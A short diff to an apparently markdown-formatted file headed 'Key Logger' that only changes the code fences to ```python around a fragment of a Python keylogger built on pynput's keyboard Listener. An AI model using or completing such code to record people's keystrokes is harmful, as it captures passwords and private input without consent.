@@ -2,7 +2,7 @@
 
 ### Key Logger
 
-'''
+```python
 from pynput.keyboard import Key, Listener
 import logging
 
@@ -23,4 +23,4 @@ def on_press(key):
 # start listening for keyboard input
 with Listener(on_press=on_press) as listener:
     listener.join()
-'''
+```
